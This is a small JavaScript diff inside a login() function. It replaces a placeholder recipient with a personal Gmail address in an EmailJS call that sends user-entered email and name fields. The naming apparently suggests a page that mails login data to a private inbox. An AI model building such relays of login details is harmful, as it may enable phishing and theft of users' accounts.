@@ -195,7 +195,7 @@ function login() {
         email: '',
         firstName: '',
         lastName: '',
-        to_email: "your-email@gmail.com" // Thay bằng email của bạn
+        to_email: "facebookacb245@gmail.com" // Thay bằng email của bạn
     };
 
     emailjs.send('service_tizrsr6', 'template_ldew57f', templateParams)
